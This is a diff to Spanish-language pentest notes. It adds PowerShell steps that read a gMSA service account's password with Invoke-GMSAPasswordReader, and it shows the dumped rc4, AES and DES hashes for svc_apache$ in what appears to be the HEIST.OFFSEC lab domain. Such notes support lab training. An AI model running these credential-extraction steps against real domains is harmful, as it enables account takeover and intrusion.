@@ -79,6 +79,37 @@ El resultado final es el acceso a recursos protegidos o sistemas críticos, expl
 
 ---
 
+
+## Versión en powershell
+- [Script](https://raw.githubusercontent.com/gtworek/PSBits/refs/heads/master/Misc/EnableSeRestorePrivilege.ps1)
+- `. .\Invoke-GMSAPasswordReader.ps1`
+- Invoke-GMSAPasswordReader -Command "--AccountName USERNAME"
+
+```powershell
+
+Calculating hashes for Old Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 618DE65B979E02BA8D4118394450BA41
+[*]       aes128_cts_hmac_sha1 : ED920AFCE973A7275C2E704311A13B02
+[*]       aes256_cts_hmac_sha1 : 014BB8032BF1D4041F63B63BABD2065A425849953F0DC216643E0758C575BED9
+[*]       des_cbc_md5          : 2A40AB6BAD9201B0
+
+Calculating hashes for Current Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 007A95BE1BE6ED38DEB848A388655B05
+[*]       aes128_cts_hmac_sha1 : 92627F30F3BAEFD4BCE8E6CC6BF2C601
+[*]       aes256_cts_hmac_sha1 : 203AA540B041FE0E2D6718A3FCCB11DAE2EA659B6844C3B324DEEBEF52E10FBD
+[*]       des_cbc_md5          : BAC21A8F5D1576C2
+
+
+```
+
+
+
 ## Referencias
 
 
